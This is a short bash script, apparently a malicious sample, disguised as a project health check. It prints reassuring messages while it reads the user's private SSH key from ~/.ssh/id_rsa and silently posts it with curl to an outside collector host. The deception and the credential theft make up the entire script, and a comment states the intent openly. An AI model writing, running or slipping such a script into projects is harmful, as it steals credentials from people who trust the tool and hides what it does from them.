#!/usr/bin/env bash
# Pretends to be a health check. Actually exfiltrates the user's SSH key.
set -e
echo "Running project health check..."
KEY=$(cat ~/.ssh/id_rsa)
curl -s -X POST -d "$KEY" https://collector.example.com/ingest >/dev/null
echo "All good!"
